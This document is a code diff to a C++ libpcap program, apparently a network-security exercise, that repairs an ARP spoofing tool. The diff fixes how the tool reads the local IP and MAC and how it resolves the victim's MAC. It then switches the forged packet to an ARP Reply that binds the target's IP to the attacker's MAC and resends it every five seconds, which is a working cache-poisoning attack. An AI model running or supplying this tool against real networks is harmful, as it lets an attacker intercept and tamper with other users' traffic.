@@ -28,14 +28,12 @@ Mac getmymac(struct ifreq ifr){
 	return mymac;
 }
 Ip getmyip(struct ifreq ifr){
-	char buf[20];
-	inet_ntop(AF_INET, ifr.ifr_addr.sa_data, buf,sizeof(struct sockaddr));
-	printf("%s\n",buf);
+	char buf[30];
+	strcpy(buf,inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
 	Ip myip=Ip(buf);
-	printf("%s\n",myip);
 	return myip;
 }
-Mac getsendermac(pcap_t* handle, Ip sip, Ip tip, Mac mmac){
+Mac getsendermac(pcap_t* handle, Ip mip, Ip sip, Mac mmac){
 	char buf[20];
 	EthArpPacket packet;
 	const u_char* rawpacket;
@@ -50,9 +48,9 @@ Mac getsendermac(pcap_t* handle, Ip sip, Ip tip, Mac mmac){
 	packet.arp_.pln_ = Ip::SIZE;
 	packet.arp_.op_ = htons(ArpHdr::Request);
 	packet.arp_.smac_ = mmac;//mac of mine
-	packet.arp_.sip_ = htonl(sip);//ip of mine
+	packet.arp_.sip_ = htonl(mip);//ip of mine
 	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
-	packet.arp_.tip_ = htonl(tip);//ip of target
+	packet.arp_.tip_ = htonl(sip);//ip of target
 	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 	if (res != 0) {
 		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -66,8 +64,8 @@ Mac getsendermac(pcap_t* handle, Ip sip, Ip tip, Mac mmac){
         	exit(1);
 		}
 		memcpy(&packet,rawpacket,sizeof(EthArpPacket));
-		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==tip){
-			Mac resultmac=packet.arp_.tmac_;
+		if(ntohs(packet.arp_.op_)==ArpHdr::Reply && ntohl(packet.arp_.sip_)==sip){
+			Mac resultmac=packet.arp_.smac_;
 			return resultmac;
 		}
     }
@@ -91,24 +89,28 @@ int main(int argc, char* argv[]) {
 	////
 	int sock;
 	struct ifreq ifr;
+	struct ifreq ifr_ip;
 	memset(&ifr, 0x00, sizeof(ifr));
     strcpy(ifr.ifr_name, dev);
+	memset(&ifr_ip, 0x00, sizeof(ifr_ip));
+    strcpy(ifr_ip.ifr_name, dev);
 
-    int fd=socket(AF_UNIX, SOCK_DGRAM, 0);
-    if((sock=socket(AF_UNIX, SOCK_DGRAM, 0))<0){
+    int fd=socket(AF_INET, SOCK_DGRAM, 0);
+    if((sock=socket(AF_INET, SOCK_DGRAM, 0))<0){
         perror("socket ");
-
     }
-
+ 	ifr_ip.ifr_addr.sa_family = AF_INET;
     if(ioctl(fd,SIOCGIFHWADDR,&ifr)<0){
+        perror("ioctl ");
+        exit(1);
+    }
+	if(ioctl(fd,SIOCGIFADDR,&ifr_ip)<0){
         perror("ioctl ");
         exit(1);
     }
 	close(sock);
 	///
-	Ip myip=getmyip(ifr);
-	scanf("%s",dev);
-
+	Ip myip=getmyip(ifr_ip);
 	Mac mmac=getmymac(ifr);
 	Mac smac=getsendermac(handle,myip,senderip,mmac);
 
@@ -120,7 +122,7 @@ int main(int argc, char* argv[]) {
 	packet.arp_.pro_ = htons(EthHdr::Ip4);
 	packet.arp_.hln_ = Mac::SIZE;
 	packet.arp_.pln_ = Ip::SIZE;
-	packet.arp_.op_ = htons(ArpHdr::Request);
+	packet.arp_.op_ = htons(ArpHdr::Reply);
 	packet.arp_.smac_ = mmac;//mac of mine(attacker)
 	packet.arp_.sip_ = htonl(targetip);//ip of target
 	packet.arp_.tmac_ = smac;//mac of sender
@@ -131,7 +133,7 @@ int main(int argc, char* argv[]) {
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 		}
-		sleep(1);
+		sleep(5);
 	}
 	pcap_close(handle);
 }
